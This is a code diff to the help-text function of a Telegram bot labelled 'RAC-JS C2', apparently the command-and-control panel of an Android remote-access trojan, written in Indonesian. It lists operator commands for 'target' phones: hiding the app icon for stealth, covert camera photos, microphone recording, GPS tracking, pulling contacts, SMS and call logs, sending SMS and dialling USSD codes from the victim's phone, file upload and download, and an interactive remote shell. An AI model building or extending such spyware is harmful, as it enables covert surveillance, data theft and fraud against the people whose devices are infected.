@@ -230,35 +230,47 @@ if (TELEGRAM_TOKEN && !TELEGRAM_TOKEN.includes('YOUR_BOT')) {
 
     const sendHelpMessage = (ctx) => {
         const helpText = `
-📖 <b>Daftar Perintah RAC-JS</b>
+📖 <b>Daftar Eksekusi Perintah (RAC-JS C2)</b>
 
-<b>1. Mode Interaktif (Satu Klik)</b>
-Cukup ketik /list, pilih perangkat, dan tekan tombol:
-📡 Ping | 🎯 Lokasi | 🔋 Baterai | 🔦 Torch 
-📞 Kontak | 📩 Inbox SMS | 🔊 Record Audio
-📻 Info Volume | 🌐 WiFi Scan | 📋 Clipboard
-ℹ️ Info Sistem | ⚙️ Sensor
+Format Eksekusi Manual:
+<code>/cmd [id_device] [command] [payload_opsional]</code>
 
-<b>2. Mode Lanjutan (Manual)</b>
-Harus diketik dengan format: 
-<code>/cmd [id_device] [nama_perintah] [teks_opsional]</code>
+⚙️ <b>Utilitas Dasar</b>
+• <b>ping</b>: Uji latensi interval dari *long-polling*.
+• <b>get_device_info</b>: Menarik spesifikasi fisik dan OS Android.
+• <b>get_battery</b>: Melaporkan persentase baterai sistem.
+• <b>get_volume</b> / <b>set_volume</b>: Mengelola metrik audio sistem. Payload: <code>[music/ring/alarm] [vol]</code>
+• <b>hide_app</b>: Menonaktifkan visibilitas *Launcher Icon* di menu ekosistem.
 
-• <b>show_toast</b> : Memunculkan popup teks di layar target
-• <b>shell</b> : Mengeksekusi perintah terminal Linux/Android
-• <b>set_volume</b> : Mengatur volume (music/ring/alarm/notification) [angka]
-• <b>tts</b> : Berbicara text-to-speech menirukan suara robot
-• <b>notify</b> : Memunculkan Push Notification di HP target (Format: <code>Judul|Isi Pesan</code>)
-• <b>sms_send</b> : Mengirim SMS dari HP target dari latar belakang (Format: <code>Nomor|Pesan</code>)
-• <b>play_sound</b> : Mendownload dan memutar mp3 secara tersembunyi/latar belakang dari URL web
-• <b>record_sound</b> : Merekam mikrofon (Format: argumen detik, cth <code>5</code>)
-• <b>hide_app</b> : Menyembunyikan ikon aplikasi dari Laci Utama HP Target (Stealth Mode)
-• <b>vibrate</b> : Menggetarkan HP target (Format: angka detik, cth <code>3</code>)
-• <b>play_alarm</b> : Membunyikan sirine/nada alarm sekencang mungkin
-• <b>get_call_logs</b> : Mengambil histori panggilan keluar/masuk (Format: limit angka, cth <code>20</code>)
-• <b>get_installed_apps</b> : Mendapatkan daftar lengkap aplikasi target yang terinstal
-• <b>open_url</b> : Memaksa target membuka browser (Format: link tujuan, cth <code>google.com</code>)
-• <b>set_wallpaper</b> : Mengubah Wallpaper target (Format: URL link gambar)
-• <b>dial_number</b> : Melakukan panggilan keluar/USSD paksa (Format: nomor HP target, cth <code>*123#</code>)
+🛠️ <b>Hardware & Lingkungan</b>
+• <b>vibrate</b>: Mengaktifkan haptic feedback (bypass DND). Payload: <code>[detik]</code>
+• <b>torch</b>: Akselerasi Flash Kamera. Payload: <code>on</code> / <code>off</code>
+• <b>sensors</b>: Menarik spesifikasi array hardware sensor.
+• <b>wifi_scan</b>: Rekaman frekuensi jaringan WiFi/SSID lokal.
+• <b>location</b>: Parsing titik kordinat bujur/lintang (GPS).
+
+📸 <b>Media Audio & Visual</b>
+• <b>photo front</b> / <b>photo back</b>: *Snapshot* resolusi tinggi dan render matriks Base64.
+• <b>record_sound</b>: Merekam modul I/O mikrofon audio. Payload: <code>[detik]</code>
+• <b>play_sound</b>: Merender audio secara asinkronus ke latar OS. Payload: <code>[url_mp3]</code>
+• <b>tts</b>: Sintesis suara virtual dari Google (*Voice rendering*). Payload: <code>[teks_pesan]</code>
+• <b>play_alarm</b>: Membunyikan nada sirine bawaan sistem maksimal.
+
+🗂️ <b>Manajemen Data (I/O)</b>
+• <b>contacts</b> / <b>sms_list</b> / <b>get_call_logs</b>: Penarikan data struktural log komunikasi dan telpon.
+• <b>sms_send</b>: Transmisi pesan jarak jauh melalui *Intent SMS*. Payload: <code>[nomor]|[pesan]</code>
+• <b>clipboard</b>: Evaluasi state pointer *copy-paste* terbaru.
+• <b>get_installed_apps</b>: Mengagregasi *Package Name* yang terpasang pada subsistem.
+• <b>ls</b>: Menjalankan mode peramban file internal. Payload: <code>[alamat_path]</code>
+• <b>upload</b> / <b>download</b>: Dropping atau mengevakuasi payload file ke media lokal.
+• <b>shell</b>: Emulasi Terminal interaktif Android Shell/Bash. Payload: <code>[perintah_bash]</code>
+
+📱 <b>Notifikasi & Layar</b>
+• <b>show_toast</b>: Pembuatan pop-up transien internal. Payload: <code>[is_teks]</code>
+• <b>notify</b>: Memicu notifikasi *Push* pada status bar. Payload: <code>[Title]|[Message]</code>
+• <b>open_url</b>: Transisi eksekusi paksa browser sistem. Payload: <code>[url]</code>
+• <b>set_wallpaper</b>: Injeksi kustomisasi pada profil wallpaper perangkat. Payload: <code>[url_gambar_resolusi]</code>
+• <b>dial_number</b>: Resolving transisi *dialer* nomor/USSD. Payload: <code>[nomor_tujuan]</code>
 `;
         ctx.reply(helpText, { parse_mode: 'HTML' });
     };
